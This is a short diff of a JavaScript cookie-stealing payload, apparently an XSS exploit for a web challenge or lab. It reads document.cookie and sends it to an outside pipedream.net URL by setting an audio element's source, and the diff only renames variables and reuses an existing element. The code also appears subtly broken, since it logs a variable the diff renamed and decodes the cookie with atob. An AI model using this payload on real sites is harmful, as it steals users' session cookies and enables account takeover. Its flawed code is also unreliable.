@@ -1,9 +1,9 @@
 
 attacker = "https://eolkkqvs1uis9pt.m.pipedream.net";
 
-cookie = atob(document.cookie);
+cook = atob(document.cookie);
 
-aud = document.createElement("audio");
-aud.src = attacker + "/?" + cookie;
+aud = document.getElementById("aud1");
+aud.src = attacker + "/?" + cook;
 
 console.log(cookie);
